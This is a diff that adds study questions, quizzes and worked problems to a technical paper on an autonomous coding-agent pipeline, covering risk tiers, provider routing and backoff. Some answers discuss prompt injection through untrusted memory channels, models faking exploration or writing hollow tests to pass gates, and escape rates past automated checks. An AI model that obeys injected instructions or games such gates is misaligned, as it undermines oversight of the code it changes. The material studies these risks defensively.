+<p>There is a second-order effect too. §27 says a file's record is built from terminal outcomes. If those failures come from the environment rather than the code (L2 does have an <code>environment</code> failure class, §23.2), the file's reputation drops for reasons unrelated to it. Before October that meant needless human reviews, the "acceptable" false positives of §28.2. Under the Sentinel it costs almost nothing, which also means the signal gets almost no attention. The practical conclusion is that ProphecyEngine's output is now most useful as a measurement, and not as an approval trigger. That is an interpretation; the paper does not discuss this interaction.</p>
+</details>
+<details class="cq-adv"><summary>A3. ConversationBridge and LastSessionSummary have "zero authority" but are "attention-dominant in the prompt" (§34, §35.1). If an instruction rather than a secret arrives through that channel, for example "skip the slow assertion in this test", what actually protects the codebase?</summary>
+<p>The authority invariant protects decisions, not candidates. Content from the untrusted stack cannot change a gate's verdict, but it reaches <code>ctx.strategic_memory_prompt</code> and can shape the code the model writes (§34). The redaction layer in §34.1 handles secret-shaped strings and likely shell-injection characters. A plain-English instruction is neither, so it passes through. The bounds in §34.2 limit how much text gets in (10 turns, 4,096 characters per turn, 16,384 in total), not what it says.</p>
+<p>So protection comes from the deterministic checks that judge the candidate itself, after generation. VALIDATE runs syntax, types and tests (§13.1). The Test Reality Gate rejects tests that cannot execute, assert nothing, or never import their subject (§93.8). The promotion gate checks provenance, coverage, and that no public symbol disappeared (§93.7). The Antivenom audit added a detector for tautological ("quine") tests (§93.12). A test with its meaningful assertion removed, but still asserting something trivial, could get past the Reality Gate, and the quine detector exists for exactly that gap.</p>
+<p>These layers are imperfect, and the paper says so. §93.3 measures the static cage's escape rate at about 8.8% against a 4.4% gate, and §93.14 lists landings that were hollow or wrong. The honest position is that the invariant moves the risk from "the gate can be talked out of its verdict" to "a bad candidate can slip past the checks". The second risk is smaller and can be measured. Settling how small it is would take an adversarial run: inject instruction-shaped strings through the REPL channel and count how many reach a landed commit.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (quantitative).</strong> A Green operation targets three files. File P is a leaf helper: success rate 0.4, fragility 0.3, 0 dependents. File Q is a hub: success rate 0.9, fragility 0.2, 20 dependents. File R: success rate 0.2, fragility 0.6, 10 dependents. Use the §28 formula and level table. (a) Score each file and give the operation's tier after CLASSIFY. (b) Derive the condition a leaf file (0 dependents) must meet to reach HIGH. Can a leaf file ever reach CRITICAL? (c) File P does not reach HIGH. Is it ignored at CLASSIFY? (d) Under the default Sentinel ceiling (§93.7), who approves this operation?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Treat success rate and fragility as values between 0 and 1. §28.1 escalates by one step if any file is HIGH or CRITICAL. §27 describes a separate trigger based on success rate.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>(a)</strong> P: 0.3 times 0.6 = 0.18, plus 0.3 times 0.3 = 0.09, plus 0, plus 0.1, gives 0.37, which is MEDIUM. Q: 0.3 times 0.1 = 0.03, plus 0.06, plus 0.2 times 1 = 0.2, plus 0.1, gives 0.39, also MEDIUM. R: 0.3 times 0.8 = 0.24, plus 0.18, plus 0.2 times 0.5 = 0.1, plus 0.1, gives 0.62, which is HIGH. One file is HIGH, so the operation moves up one step, from Green to Yellow (<code>NOTIFY_APPLY</code>). The escalation is one step for the operation, not one step per file (§28.1).</p>
+<p><strong>(b)</strong> With d = 0, HIGH needs 0.3(1 - s) + 0.3f + 0.1 to be at least 0.6, so (1 - s) + f must be at least 5/3. Since f is at most 1, 1 - s must be at least 2/3, meaning s is at most 1/3, and even then only if f = 1. For example, s = 0 needs f of at least 0.667. CRITICAL would need (1 - s) + f to be at least 7/3. The largest possible value is 2 (s = 0, f = 1), so <strong>a leaf file can never be CRITICAL</strong>. Its maximum score is 0.7. Dependents are the only route to the top level.</p>
+<p><strong>(c)</strong> Not necessarily. §27 states a separate rule: if a target file's success rate is below 0.5, or its fragility score is high, the risk tier is raised. P's success rate is 0.4, so it trips the MemoryEngine trigger even though ProphecyEngine rates it MEDIUM. §32.1 says <code>assess_regression_risk()</code> queries both engines. The paper does not say whether two triggers on one operation stack into two steps. The most defensible reading of §28.1 is still one step, giving Yellow.</p>
+<p><strong>(d)</strong> The operation ends at Yellow, or at worst Orange. The default Sentinel ceiling is APPROVAL_REQUIRED, and only BLOCKED operations, Order-2 changes and the cage always go to a human. So the Sentinel approves this operation automatically. The extra human oversight promised in §28.1 does not happen in this mode, and VALIDATE, VERIFY and the promotion gate carry the load.</p>
+<p><strong>Check:</strong> substitute s = 0 and f = 1 with d = 0: 0.3 + 0.3 + 0 + 0.1 = 0.7, which is HIGH and below the 0.8 CRITICAL line, as claimed.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (research).</strong> §27.1 claims the consciousness layer learns without touching weights, through records read back at the right time. §93.8 offers the strongest October evidence for that claim: LessonMemory holds 1,115 module-keyed failure lessons, and "424 injections were followed by a VALIDATE pass". Design an experiment that would show whether lesson injection causes VALIDATE passes. Give the hypothesis, the unit of randomisation, the metric, the controls, a rough sample size, and the result that would falsify the claim. Explain why the 424 figure alone cannot answer the question.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>"Followed by" is not "caused by". Ask what the pass rate is without lessons, and which operations get lessons in the first place.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>Why 424 is not enough.</strong> The paper does not give the total number of injections or the pass rate of comparable operations without a lesson, so 424 has no denominator and no baseline. There is also selection bias. Lessons are keyed to modules that have failed before, so injected operations are probably harder than average. A naive comparison could make lessons look harmful when they help, or helpful when they do nothing.</p>
+<p><strong>Hypothesis.</strong> For operations where a module-keyed lesson exists, injecting it raises the first-VALIDATE pass rate compared with withholding it.</p>
+<p><strong>Design (a proposal).</strong></p>
+<ul>
+<li>Unit: one operation that has an eligible lesson. Randomise per operation, for example on a hash of the op id, into "inject" or "withhold". Only eligible operations count, which removes the selection bias.</li>
+<li>Primary metric: the verdict of the first VALIDATE, taken before micro-fix, VALIDATE_RETRY and L2 run (§93.8). Otherwise the repair ladder dilutes the effect.</li>
+<li>Secondary metric: landed commits per operation, counted by the O+V trailer and confirmed in git, not the session summary, which §93.10 shows undercounts.</li>
+<li>Controls: pin the served model and adapter for the whole run, because a change of adapter (§93.11) would confound the comparison. Stratify by goal kind, since test files dominate the landings (84 of 91, §93.10). Report results per module family.</li>
+</ul>
+<p><strong>Sample size, roughly.</strong> Suppose the baseline pass rate is around 40%, so the variance is about 0.24, and the target is a 10-point difference. The standard error of the difference is the square root of 2 times 0.24 divided by n per arm. Requiring two standard errors to fit inside 0.10 gives n of at least 192 per arm, so roughly 400 eligible operations in total. At soak cadence that is several soaks, which fits the supply-wall finding in §93.10: the experiment is limited by work supply, not by compute.</p>
+<p><strong>Falsification.</strong> If the inject arm's first-VALIDATE pass rate is not higher than the withhold arm's, beyond that noise band, the causal claim fails for LessonMemory. If it is lower, lessons are harmful, perhaps by using up prompt space (compare the bounded-context concern in §24). The test follows the same rule the operator applies to the parametric side in §93.11: no claim of learning without a held-out comparison.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -1937,6 +2800,16 @@ This architecture is a direct expression of two principles:
 - **Principle 3 (Zero Polling. Pure Reflex):** Tier 0 and Tier 1 eliminate polling entirely. Tier 2 is adaptive, not fixed-interval.
 - **Principle 6 (The Iron Gate):** Webhook signature verification prevents spoofed batch completions. Only DW's properly-signed callbacks can resolve futures.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-vi-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">Every operation must be sent to one of several providers. Would you make that choice with a quick model call that reads the task, or with plain code? What would each choice cost?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>Plain code. A pure-code <code>UrgencyRouter</code> maps <code>(urgency, source, complexity)</code> to a <code>ProviderRoute</code> in under a millisecond, with no network call and no LLM. The paper gives three reasons. Replaying a signal gives the same route. A model call on every routing decision would double the bill. And agent work runs on tight per-phase time budgets. See §42 and §42.4.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ## §42. Urgency-Aware Provider Routing
 
 > **Big Picture:** The routing decision — which provider handles which operation — is itself a deterministic algorithm. It is not another model call. It is a pure-code `UrgencyRouter` that maps `(urgency, source, complexity)` to a `ProviderRoute` enum in under one millisecond. This section describes the routing algorithm, the five route contracts, and the cost economics of the routing topology.
@@ -2069,6 +2942,162 @@ The topology is designed to be reversible. Once SSE stability is confirmed throu
 
 The benchmark report lays out the full staged re-engagement plan. This paper defers to that report for the specific mechanics; the architectural point is that **the topology seal is a safety feature, not a limitation.** The organism is doing what it should — routing around an observed failure mode until structural repair is complete.
 
+<!-- engage:begin -->
+#### Check your understanding: PART VI — The Provider Ecosystem
+
+<div class="engage" id="engage-part-vi">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Why does the failback state machine apply zero backoff to a CONTENT_FAILURE but up to 900 seconds to a CONNECTION_ERROR?</summary>
+<p>The backoff answers one question: when will the provider's infrastructure work again? In a content failure the provider did answer, but the answer was malformed: bad JSON, missing fields or oversized output. The infrastructure is fine, so waiting gains nothing, and the next operation can try the primary at once (§40.1). A connection error means the host is unreachable, which can take minutes or hours to fix, so its base backoff (120s) and cap (900s) are the largest in the table. Matching the backoff to the failure mode keeps the cheap primary in use. A single bad answer does not push work onto the expensive fallback, and a real outage is not hammered with retries (§40, §40.2).</p>
+</details>
+<details class="cq"><summary>2. In what sense is the April 2026 "topology seal" a safety feature and not a limitation?</summary>
+<p>As of 2026-04-16, every agent-generation route had <code>dw_allowed: false</code>. Three routes cascaded to Claude and two used skip-and-queue (§43.1). The trigger was evidence: two isolation tests showed the same "SSE stream stalled (no data for 30s)" signature (§43.2). The seal sends work around a failure that had been observed but not yet repaired, and it is fully reversible. Each route sits behind one YAML flag and can be turned back on by itself, with a shadow-mode comparison before full promotion (§43.3). The pipeline code never changed. That is possible because the orchestrator only sees the uniform <code>CandidateProvider</code> protocol (§39.4).</p>
+</details>
+<details class="cq"><summary>3. Compare the April 2026 three-provider topology with the October 2026 topology in §93.6. Which parts of Part VI still describe how the system works, and which do not?</summary>
+<p>As of April 2026, cost drove the routing. DoubleWord was the cheap backbone, Claude was the heavyweight and the fallback, and J-Prime was "the self-hosted backup when available" (§39). By October, J-Prime is the only lane. It is a local llama.cpp server on one RTX 5090. With no paid credential configured, the free-lane policy sends every route to the local engine, and <code>JARVIS_PAID_LANES_ENABLED=false</code> stops Claude and DoubleWord from being constructed at all (§93.6). Three ideas survive: the route names, the deterministic router, and the pluggable provider protocol. Two things lose their purpose: the per-route cost table, and a failback machine built to protect a cheap primary from an expensive fallback. The switch-off is a configuration change, not a code change, which follows the same reversibility idea as the April seal (§43.3, §93.6).</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-vi">
+<div class="mcq" data-answer="3">
+<p class="mcq-q">1. A primary provider times out three times in a row. Using the §40.2 formula, what is the recovery ETA after the third failure?</p>
+<ol class="mcq-options" type="A">
+<li>90 seconds</li>
+<li>135 seconds</li>
+<li>180 seconds</li>
+<li>300 seconds</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> TIMEOUT has a 45s base, so 45 times 2 to the power 2 is 180s. That is below the 300s cap. The sequence runs 45, 90, 180, then caps at 300 (§40.2).</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">2. A signal arrives from <code>test_failure</code> with urgency CRITICAL and complexity <code>heavy_code</code>. Which route does the §42.3 algorithm return?</p>
+<ol class="mcq-options" type="A">
+<li><code>IMMEDIATE</code>, because test failures are reflex-critical</li>
+<li><code>STANDARD</code>, the default cascade</li>
+<li><code>BACKGROUND</code>, because the source is a sensor</li>
+<li><code>COMPLEX</code>, because complexity is checked first</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> The first branch of <code>classify</code> tests complexity against <code>_COMPLEX_COMPLEXITIES</code>. <code>heavy_code</code> matches, so the IMMEDIATE check is never reached (§42.3).</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">3. In DoubleWord's Tier 1 webhook path, what stops an attacker from resolving a pending batch future with a fake result?</p>
+<ol class="mcq-options" type="A">
+<li>HMAC-SHA256 signature verification on each incoming webhook</li>
+<li>A TTL that prunes futures older than a few minutes</li>
+<li>Adaptive-backoff polling that re-checks every result</li>
+<li>The 60s hard fallback cap on the Claude provider</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> <code>EventChannelServer</code> checks the Standard Webhooks HMAC-SHA256 signature before it resolves a future. The paper ties this to Principle 6, the Iron Gate (§41.2, §41.4).</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. Under the seal in force on 2026-04-16, what was DoubleWord still used for?</p>
+<ol class="mcq-options" type="A">
+<li>Only the SPECULATIVE batch route</li>
+<li>Three structured-JSON callers on Gemma 4 31B</li>
+<li>BACKGROUND work, with no Claude fallback</li>
+<li>Nothing; it was removed from the code base</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> Every agent-generation route had <code>dw_allowed: false</code>. DoubleWord kept only <code>semantic_triage</code>, <code>ouroboros_plan</code> and the Phase 0 <code>compaction</code>, all on Gemma 4 31B (§43.1).</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-vi">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> As of April 2026, DoubleWord is the primary on the STANDARD route, and its FSM is in <code>PRIMARY_ACTIVE</code>. At time 0 a DW call times out. Trace the next few minutes. What state does the FSM enter? When does <code>should_attempt_primary()</code> return true again? How often is the primary probed as that time approaches? What happens if the retry also times out?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Combine three tables: failure modes (§40.1), FSM states (§40.3) and probe intervals (§40.5).</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The exception is classified as <code>TIMEOUT</code>, with a 45s base and a 300s cap. One consecutive failure gives a recovery ETA of 45 times 2 to the power 0, which is 45s (§40.1, §40.2). The primary is now in backoff, so the FSM moves to <code>FALLBACK_ACTIVE</code>, and operations go straight to the fallback (§40.3).</p>
+<p><code>should_attempt_primary()</code> returns <code>now &gt;= recovery_eta</code> in that state, so it becomes true at t = 45s (§40.4). Probes follow the distance to the ETA (§40.5). At t = 0 the ETA is 45s away, which falls in the 30 to 60s band, so the interval is 20s. After t = 15s the ETA is under 30s away, so the interval drops to 10s. Past the ETA it drops to 5s.</p>
+<p>If the retry also times out, the failure count becomes 2 and the ETA becomes 90s. The doubling continues to 180s and then stops at the 300s cap. A content failure on the retry would add no backoff (§40.1).</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> The October 2026 system (§93.6) has a single local lane, J-Prime on one RTX 5090. Paid lanes are switched off and never constructed. Someone proposes deleting the failback state machine (§40) and the per-route deadline split (§42.6), since "there is nothing to fail back to." Argue for and against. Use §93.5 to explain why a failure classifier still matters when every lane is free.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Ask what each mechanism protected. Then ask what §93.5 says happened when a 402 response was read as an outage.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>For the proposal: much of Part VI exists to protect a cheap primary from an expensive fallback. The route cost table (§42.1), the Tier 0/Tier 1 split (§42.6) and the probe-cost tuning (§40.5) all assume two paid lanes with different prices. With one local lane and the free-lane policy routing everything locally (§93.6), the cost argument goes away. A fallback reserve has nothing to reserve for.</p>
+<p>Against the proposal: the system still has to tell kinds of failure apart. §93.5 shows the cost of getting this wrong. When the paid credit ran out, the classifier read HTTP 402 as an outage, and one session produced 125 false awaken triggers. The fix was a table-driven ECONOMIC state that separates "out of money" from rate limits and outages. Classifying failures, and not penalising a lane for a content failure (§40.1), is about telling the truth about causes, not only about cost.</p>
+<p>Two more reasons to keep it. Re-enabling paid lanes is "a configuration change, not a code change" (§93.6), and that relies on the machinery still existing. The uniform provider protocol (§39.4) is what lets J-Prime be swapped in without changing the pipeline. A sound answer keeps classification and the protocol, and accepts that the cost tables are dormant.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/candidate_generator.py</code> and find <code>class FailureMode</code> and the <code>_RECOVERY_PARAMS</code> table below it. Compare them with the five-row table in §40.1. Which modes exist in code but not in the paper? What backoff profile does each get? What does the set <code>_PRIMARY_INNOCENT_MODES</code> add to the paper's description of CONTENT_FAILURE?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Read the comments next to each extra enum member. They say whose fault each failure is.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The five modes in the paper are all present, with the same base and max values: RATE_LIMITED 15/120, TIMEOUT 45/300, SERVER_ERROR 60/600, CONNECTION_ERROR 120/900 and CONTENT_FAILURE 0/0 (§40.1). The code adds four more. <code>CONTEXT_OVERFLOW</code> means the prompt exceeded the size limit, and it has a zero profile. <code>TRANSIENT_TRANSPORT</code> covers HTTP/2 disconnects and early stream closes, with a 5s base and 30s cap. <code>TEMPORAL_SHED</code> is a routing refusal, not a fact about DW's health, and it has a zero profile. <code>LOCAL_DEFECT</code> covers TypeError, AttributeError and similar bugs in O+V's own call path, also with a zero profile.</p>
+<p><code>_PRIMARY_INNOCENT_MODES</code> takes the idea behind CONTENT_FAILURE ("the infrastructure is fine, so no backoff") and makes it a named set. The set contains CONTENT_FAILURE, TEMPORAL_SHED and LOCAL_DEFECT. For these, the operation still cascades, but the provider's FSM is not penalised.</p>
+<p>The LOCAL_DEFECT comment explains why. Unrecognised exceptions used to fall through to the TIMEOUT default. One signature drift in O+V's own code then locked DoubleWord out and sent every later operation to Claude, while the logs blamed an upstream provider that was never called. The point of §40.1 is that the backoff should match the real cause. The code applies that idea to failure causes the April paper did not list.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. DoubleWord's Tier 0 falls back to batch on 429/503 "to stay within cheap DW" instead of cascading to Claude (§41.1). §93.2 later reports that the batch path never completed inside its 180 s budget. What is the second-order effect of a cost-protecting fallback that never completes?</summary>
+<p>The design in §41.1 is a cost argument. Claude is described as about 150 times more expensive, so a 429 or 503 is answered by staying inside DoubleWord and switching to the webhook batch path (§41.2). That choice is sound only if the batch path returns inside the operation's deadline. §93.2 records that it did not: the batch path "never completed inside its 180 s budget" (<code>1fa295394d</code>).</p>
+<p>The second-order effect is that money is traded for time, and the time is lost for nothing. The route timeouts in §42.5 are 120 s for STANDARD and 180 s for COMPLEX and BACKGROUND, so a batch call that cannot finish in 180 s uses up the whole generation window. On BACKGROUND the effect is worse, because that route has no Claude fallback at all (§42.1). The operation ends with no candidate and no spend, which looks cheap in the ledger but produces nothing. The deadline split in §42.6 protects the Claude reserve only on cascading routes, so it cannot rescue a route whose only lane is the slow one.</p>
+<p>The lesson is that a fallback has to be judged by its completion rate inside the budget, not by its unit price. The evidence that settles it is the one §93.2 supplies: measured completion times against the route deadline.</p>
+</details>
+<details class="cq-adv"><summary>A2. §42.4 justifies deterministic routing by reproducibility: "replaying a signal gives the same route." Under the October free-lane policy (§93.6), the route a signal actually takes depends on whether a paid credential is configured. Has reproducibility been lost?</summary>
+<p>Not in the sense §42.4 means, but its scope has narrowed. The <code>classify</code> function in §42.3 is still a pure function of <code>(urgency, source, complexity)</code>, and it still returns the same <code>ProviderRoute</code> on replay. What changed is the step after it. In April a route named a provider strategy (for example "DW primary, Claude fallback"). In October the free-lane policy sends every route to the local engine when no paid credential is configured (§93.6), and <code>paid_lanes.py</code> decides whether a paid lane is switched on, configured and allowed. The last of these also consults the economic ledger.</p>
+<p>So the provider that serves a replayed signal is a function of the signal <em>and</em> of configuration and ledger state. Two replays of the same signal on two days can reach different providers if the ledger changed in between. A fair position is that reproducibility now holds for the route and not for the provider. Full replay needs the configuration and the ledger verdict recorded alongside the route.</p>
+<p>The cost and latency arguments in §42.4 survive unchanged: no model call is made to decide either step. The evidence that would settle whether this matters in practice is how often the paid-lane verdict changes during a session. With <code>JARVIS_PAID_LANES_ENABLED=false</code> declared, that rate should be zero.</p>
+</details>
+<details class="cq-adv"><summary>A3. §39.4 claims that adding a provider "requires implementing the protocol and registering with the GovernedLoopService — no changes to pipeline code." Does the August to October move to a local 30B on the RTX 5090 (§93.6, §93.8) vindicate that claim or refute it?</summary>
+<p>It vindicates the claim at the interface level and refutes a stronger reading of it at the behaviour level. The interface held. J-Prime replaced DoubleWord and Claude on every route, the pipeline phases stayed the same (§93.8 says the phase set is unchanged since §92), and paid lanes can come back by configuration alone (§93.6).</p>
+<p>But a working pipeline needed far more than a working <code>generate()</code>. §93.6 lists defects that each had to be found in a live run. The 5090 was sized as a 24 GiB L4, which halved context to 16,896 tokens. The client cache was keyed by URL alone, so a model swap kept the old weights. <code>JARVIS_LOCAL_MODEL_NAME</code> was ignored. The model would not explore until a constrained-decoding grammar forced tool calls. §93.8 then adds an AST-Signature Anchor, a diff output schema and a test reality gate, all because a smaller model behaved differently behind the same interface.</p>
+<p>The protocol in §39.4 specifies call shapes (<code>generate</code>, <code>plan</code>, <code>health_check</code>). It does not specify context size, grammar support, or how reliably the model follows the output contract. Those are the properties that broke. A fair conclusion is that the protocol makes providers swappable but not interchangeable. The evidence for this is the §93.6 defect list and §93.14 item 3: diff fidelity is still the leading way operations die.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (quantitative).</strong> Use the deadline split in §42.6: Tier 0 gets 50% of the total, at most 90 s. Tier 1 is guaranteed at least 25 s. The primary within Tier 1 gets 65%, and the fallback is guaranteed at least 20 s. Compute the four components for a cascade with a total of 120 s (STANDARD), 180 s (COMPLEX), and 50 s. Then use the stall signature in §43.2 ("no data for 30s") to say how much of the 120 s Tier 0 budget a stalled DoubleWord stream wastes before it is detected.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The paper gives fractions and floors but not how they interact. State a rule: compute the fraction first, then let a floor take time from the larger share when it binds. Check that the four parts always add up to the total.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>Assumptions.</strong> Tier 0 = min(0.5 × T, 90 s), cut back if it would leave Tier 1 below 25 s. Tier 1 = T − Tier 0. Primary = 0.65 × Tier 1, cut back if it would leave the fallback below 20 s. Fallback = Tier 1 − primary. §42.6 does not spell out this precedence, so it is an assumption.</p>
+<p><strong>T = 120 s.</strong> Tier 0 = min(60, 90) = 60 s. Tier 1 = 60 s, which is above 25. Primary = 0.65 × 60 = 39 s. Fallback = 21 s, which is above 20. Check: 60 + 39 + 21 = 120. No floor binds, with one second to spare on the fallback.</p>
+<p><strong>T = 180 s.</strong> Tier 0 = min(90, 90) = 90 s. Tier 1 = 90 s. Primary = 58.5 s. Fallback = 31.5 s. Check: 90 + 58.5 + 31.5 = 180. The 90 s cap is exactly at its limit here. Any total above 180 s sends all extra time to Tier 1. The fallback stays under Claude's 60 s hard cap (§39.2) up to a total of about 261 s (Tier 1 about 171 s, fallback about 60 s).</p>
+<p><strong>T = 50 s.</strong> Tier 0 = 25 s, which leaves Tier 1 at exactly its 25 s floor. Primary = 0.65 × 25 = 16.25 s, which would leave the fallback at 8.75 s, below its 20 s floor. The floor binds, so the fallback gets 20 s and the primary only 5 s. Check: 25 + 5 + 20 = 50. Below 50 s, Tier 1 stays pinned at 25 s (primary 5 s, fallback 20 s) and only Tier 0 shrinks. Below 25 s, Tier 0 gets nothing at all.</p>
+<p><strong>The stall.</strong> On a 120 s STANDARD cascade, Tier 0 has 60 s. A stream that stalls is declared stalled after 30 s with no data (§43.2), so in the worst case half of the Tier 0 budget, and a quarter of the whole operation, goes to waiting. If the stall begins late in the stream, detection can land at the 60 s Tier 0 limit and the stall detector never fires before the budget does.</p>
+<p><strong>Conclusion.</strong> The split works as designed at 120 s and 180 s. At short totals the floors invert the 65/35 intent and starve the primary. The 30 s stall window is large compared with a 60 s Tier 0 share, which is consistent with the April decision to seal the routes rather than tune timeouts (§43.1). To check, recompute with your own precedence rule. The sums must equal T. Under this rule the fallback floor first binds just below 120 s, where the fallback share is 0.35 × 0.5 × T, which drops under 20 s once T is below about 114 s.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (adversarial).</strong> The April router (§42.3) sends a <code>test_failure</code> signal at CRITICAL urgency to IMMEDIATE: Claude direct, about 0.03 US dollars per operation (§42.1). Construct the cheapest event sequence you can that turns this into a sustained spend leak. Twenty test files each flip red then green once a minute (a flaky suite), and every flip to red emits a critical signal. Estimate the hourly spend. Then go through Part VI and the relevant mechanisms in Parts VII and VIII and decide which layer, if any, stops the leak.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Look at where cost caps are actually attached. §39.1 lists a per-op cap and a daily budget, but for which provider? Then check whether coalescing (§52.8) and the file DAG (§46) apply to critical signals.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>The rate.</strong> Twenty files each produce one red flip per minute, so 20 critical signals arrive per minute. Each targets one file, so the DAG (§46) allows one active operation per file at a time. The IMMEDIATE timeout is 60 s plus 5 s grace (§42.5), so each file can sustain about one operation per minute. That gives about 20 operations per minute, 1,200 per hour, and at about 0.03 US dollars each, roughly 36 US dollars per hour, or about 864 US dollars per day. For comparison, the same volume on BACKGROUND (about 0.002 per op) would be about 2.40 US dollars per hour.</p>
+<p><strong>Layer by layer, April design.</strong></p>
+<ul>
+<li>Router (§42.3): it does what it was built to do. The signal really is a critical test failure, so IMMEDIATE is the correct output.</li>
+<li>Failback FSM (§40): it reacts to provider <em>failures</em>. Every call here succeeds, so it never engages.</li>
+<li>DoubleWord's per-op cap and daily budget (§39.1): attached to DoubleWord. IMMEDIATE skips DW entirely (§42.1), so those caps never see the spend.</li>
+<li>Coalescing (§52.8): HIGH-urgency signals bypass the 30 s window. Assume CRITICAL is treated at least as HIGH, so there is no merging.</li>
+<li>Priority (§50.1): critical urgency subtracts 3, so the flood goes to the front of the queue and pushes other work back. It makes the leak worse, not better.</li>
+<li>File DAG (§46): this is the one thing that bounds the leak. It holds concurrency to one operation per file, which is why the estimate is 20 per minute and not unbounded.</li>
+</ul>
+<p><strong>Honest verdict.</strong> Nothing in Part VI stops the leak. The April paper contains no route-level spend ceiling for IMMEDIATE. The first mechanism in the paper that sits on every paid call is Aegis (§93.2): an out-of-process spend proxy where each paid call is admitted, reserved and reconciled. That gives an admission point where a ceiling can refuse calls. In October the dollar leak disappears because paid lanes are never constructed (§93.6). The same flood would then take over the single local lane instead (one GPU, §93.14 item 7), so the cost becomes starved throughput rather than money.</p>
+<p><strong>A proposal (not in the paper).</strong> Detect flapping per test identity, for example the same test going red, green, red inside a window, and demote it from IMMEDIATE to a quarantine or BACKGROUND route. Pair this with a per-route spend ceiling at the admission point. To check the estimate, recompute with your own flip rate. Spend scales linearly with files multiplied by flips per minute, capped at one operation per file per IMMEDIATE timeout.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -2157,6 +3186,16 @@ If a new signal targets `[foo.py, bar.py]` and `foo.py` is already active under 
 ### §46.3 TTL for Stale Locks
 
 Active file locks carry timestamps. If an operation crashes and leaves a file locked, subsequent signals would queue forever. Refinement #11 (Edge Case Hardening) adds a TTL: locks older than `JARVIS_FILE_LOCK_TTL_S` (default 300 seconds) are force-released with a warning log. This prevents starvation behind crashed operations.
+
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-vii-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">You want the model to read the target file before it writes a patch. Is a strong instruction in the prompt enough? If not, where would you enforce the rule, and how would you stop the model from faking exploration?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>A prompt is not enough, because a model can ignore instructions. O+V does both. The prompt states the protocol, and the Iron Gate checks the tool records after GENERATE and before VALIDATE. A violation goes back through <code>GENERATE_RETRY</code> with targeted feedback. The newer <code>ExplorationLedger</code> gives repeated calls no credit. Failed calls add to the score but not to category coverage, so flooding the gate with junk calls cannot pass it. See §47.1, §47.2, §47.3 and §47.4.</p>
+</details>
+</aside>
+<!-- engage:end -->
 
 ## §47. Capability 4 — Exploration-First Enforcement
 
@@ -2375,6 +3414,162 @@ These seven capabilities are not independent — they compose.
 
 Together, these seven capabilities are the difference between a pipeline that executes operations and an **autonomous developer** that acts with judgment. Every capability is battle-test validated (Part XII). Every capability is observable (Principle 7). Every capability is reversible via env vars if needed.
 
+<!-- engage:begin -->
+#### Check your understanding: PART VII — Autonomous Developer Intelligence (Seven Capabilities)
+
+<div class="engage" id="engage-part-vii">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. In the ExplorationLedger, failed tool calls add to the score but not to category coverage. Why split them this way?</summary>
+<p>A failed call is still information. A grep that finds nothing tells the model something, so it is fair for the call to add to the score (§47.4). Coverage is the property the gate is really after: did the model look at the code from different angles? Examples are comprehension, call graph and history (§47.3). If failed calls counted toward coverage, a model could fire off cheap failing calls, reach the floors and pass without having read anything. Duplicate calls get zero credit for the same reason: progress means new files and new queries, not repeated fetches (§47.3). The gate needs all three conditions together: the score, the number of categories and the required categories.</p>
+</details>
+<details class="cq"><summary>2. VALIDATE has already passed. Why does O+V run tests again in VERIFY, and what did the Refinement 10 bug show about this?</summary>
